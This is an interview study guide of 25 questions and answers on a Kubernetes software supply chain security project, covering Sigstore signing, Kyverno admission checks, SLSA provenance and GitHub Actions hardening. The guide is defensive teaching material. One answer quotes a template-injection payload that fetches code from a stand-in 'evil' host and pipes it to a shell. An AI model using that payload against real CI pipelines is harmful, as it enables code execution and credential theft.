# Interview questions

25 questions this project prepares you for. Try to answer before opening the answer.

1. **What is a software supply chain attack? Give three real ways an attacker gets code into production.**
   <details><summary>Answer</summary>An attack on how software is built and delivered rather than on the running app. Examples: pushing a malicious image with a stolen registry token; moving a GitHub Action's version tag to a malicious commit; injecting a workflow file into a repository that steals credentials or signs images; template injection through a pull request title.</details>

2. **Why is "the image came from our private registry" not proof that it is ours?**
   <details><summary>Answer</summary>Anyone with a registry token (a leaked CI secret, a former employee, a compromised laptop) can push to it, and tags can be overwritten. The location says nothing about who built the content. Only a signature bound to the digest and to a trusted build identity does.</details>

3. **Tag vs digest: why does production use digests?**
   <details><summary>Answer</summary>A tag is a movable pointer; the same tag can point to different content tomorrow. A digest is the hash of the content and cannot change. This project keeps digests in git (`allowed-images` enforces it for workloads) and Kyverno rewrites admitted images to the verified digest (`mutateDigest`).</details>

4. **Explain keyless signing with Sigstore.**
   <details><summary>Answer</summary>The CI job gets an OIDC token from GitHub, cosign creates an in-memory key pair, Fulcio issues a short-lived certificate naming the job's identity (workflow file and ref), cosign signs the digest, and the signature is recorded in the Rekor transparency log. No long-lived key exists to steal or rotate.</details>

5. **What exact identity does production trust, and why not "any workflow of the repository"?**
   <details><summary>Answer</summary>`https://github.com/sufyanahmadkamboh/sufyan-devops-secure-supply-chain/.github/workflows/release.yaml@refs/heads/main` with issuer `https://token.actions.githubusercontent.com`. Any workflow can get a token; trusting all of them would trust an injected workflow, PR branches and the e2e test workflow.</details>

6. **What is an attestation, and which ones does this project create?**
   <details><summary>Answer</summary>A signed in-toto statement about a digest. Three: SLSA v1 provenance (repository, ref, workflow, commit, run), a Trivy vulnerability report (cosign-vuln format) and a CycloneDX SBOM. All signed by the release identity and checked at admission.</details>

7. **Is this project SLSA Build Level 3? Why or why not?**
   <details><summary>Answer</summary>No. The provenance is written and signed by the same job that builds the image, so a compromised build step could influence it. L3 requires an isolated builder that generates provenance the build cannot touch (for example the SLSA GitHub generator). This is documented as a trade-off.</details>

8. **How does Kyverno verify an image at admission? Walk through the checks.**
   <details><summary>Answer</summary>For Pods in namespaces labelled `enforce`: the ImageValidatingPolicy checks a keyless signature from the release identity (Fulcio chain + Rekor), a signed provenance whose predicate names this repository and `refs/heads/main`, a signed scan without CRITICAL/HIGH, and a signed SBOM. Then it rewrites the image to the verified digest. ValidatingPolicies check the registry and digest pinning, and the restricted pod settings.</details>

9. **Why read the vulnerability result from a signed attestation instead of scanning at admission?**
   <details><summary>Answer</summary>Scanning in the admission path would be slow and would need a vulnerability database in the critical path. The signed report is quick to check and cannot be forged by anyone without the release identity. New CVEs after build are handled by Trivy Operator.</details>

10. **What happens if Kyverno is down?**
    <details><summary>Answer</summary>With `failurePolicy: Fail`, new pods cannot be created (running pods keep running); with `Ignore`, pods would be admitted unverified. The `AdmissionControllerDown` alert fires when Prometheus cannot scrape the admission controller. This project fails closed.</details>

11. **A developer needs to run an unverifiable image during an incident. What do you do?**
    <details><summary>Answer</summary>Do not delete the policies. Create a reviewed, time-limited Kyverno PolicyException for one namespace and workload, merged through git with an owner, and remove it afterwards (runbook).</details>

12. **Why both Pod Security Admission and a Kyverno pod-security policy?**
    <details><summary>Answer</summary>Defence in depth. PSA is built into the API server and survives the deletion of Kyverno policies. Kyverno adds rules PSA does not have (read-only root file system, CPU/memory limits), clear messages, PolicyReports and an audit mode.</details>

13. **How do you roll out a new admission policy without breaking teams?**
    <details><summary>Answer</summary>Run it in Audit mode first (here: the sandbox overlay with `validationActions: [Audit]`), read the PolicyReports, fix the workloads, then switch to Deny. Policy unit tests (`kyverno test`) in CI catch rule mistakes before any cluster sees them.</details>

14. **Someone with write access commits a malicious digest to the GitOps folder. What happens?**
    <details><summary>Answer</summary>Argo CD syncs it. Kubernetes tries to create new pods; Kyverno refuses them (no release signature). With `maxUnavailable: 0` no old pod is removed, so production keeps serving. `UntrustedWorkloadBlocked` fires. Fix with `git revert`. The e2e test proves this every release.</details>

15. **Why isn't the GitOps controller a security boundary?**
    <details><summary>Answer</summary>It applies whatever is in git. Anyone who can write to the deploy path controls it. Security decisions belong at admission, where every pod is checked regardless of who created it.</details>

16. **How do you harden GitHub Actions workflows?**
    <details><summary>Answer</summary>`permissions: {}` at the top and minimal permissions per job; `id-token: write` only where signing happens; actions pinned to full commit SHAs (enforced by `check-pinned-actions.sh`) and updated by Dependabot; `persist-credentials: false`; no `${{ }}` of untrusted input in `run:`; zizmor and actionlint in CI; CODEOWNERS and branch protection on workflow files.</details>

17. **What is template injection in GitHub Actions?**
    <details><summary>Answer</summary>`${{ github.event.pull_request.title }}` inside a `run:` script is expanded into the shell code before it runs. A title like `"; curl evil | sh #` becomes code. Pass untrusted values through `env:` and use `"$VAR"` in the script.</details>

18. **Why install CLIs by checksum instead of using setup actions?**
    <details><summary>Answer</summary>Each third-party action is code from someone else running with the job's permissions. Downloading a pinned version and checking its SHA-256 removes that dependency; the remaining actions are few and SHA-pinned.</details>

19. **What does the end-to-end attack test prove that unit tests cannot?**
    <details><summary>Answer</summary>That the real policies, with real Sigstore signatures, a real registry and a real cluster, block a foreign image, an unsigned image, a tampered image, an imposter signed by a different workflow with forged provenance and a privileged trusted image, while admitting the genuine release. A wrong identity string or unsupported signature format would only show up here.</details>

20. **Why does the imposter scenario need a separate `e2e.yaml` workflow?**
    <details><summary>Answer</summary>Signatures from a job inside `release.yaml` on main would carry the trusted identity. A reusable workflow in its own file gets its own identity (`e2e.yaml`), so it can produce a valid but untrusted signature, exactly what an injected workflow would do.</details>

21. **A CVE is published for a library inside an image that is already running. How do you find out?**
    <details><summary>Answer</summary>Trivy Operator re-scans running workloads with an updated database and updates the VulnerabilityReport; `trivy_image_vulnerabilities` rises and `RunningImageHasCriticalVulnerabilities` fires after 5 minutes. The signed SBOMs show which other images contain the library.</details>

22. **How do you test alert rules?**
    <details><summary>Answer</summary>With `promtool test rules`: input series and expected alerts at given times, including cases that must not fire (for example refusals in the sandbox). They run in CI so a wrong label never silently disables an alert.</details>

23. **What can this design NOT protect against?**
    <details><summary>Answer</summary>Someone who can change `release.yaml` on main (the trust anchor), a cluster-admin (can delete policies), unknown vulnerabilities, and a compromised build step inside the release job (provenance not isolated). Protect the anchor with branch protection, required reviews and CODEOWNERS.</details>

24. **How would you revoke trust in a compromised build?**
    <details><summary>Answer</summary>There are no keys to rotate. Change the trusted identity in `verify-images.yaml` (for example a new workflow file), re-release, and images signed under the old identity are refused at their next pod creation. Rekor keeps the history for investigation.</details>

25. **Why the classic cosign signature format instead of the new bundle format?**
    <details><summary>Answer</summary>In this project's tests, Kyverno 1.19's ImageValidatingPolicy verified classic `.sig`/`.att` signatures but did not find cosign 3 bundle-format signatures. The pipeline signs with `--new-bundle-format=false --use-signing-config=false`, and the decision log marks it to revisit when Kyverno reads bundles.</details>
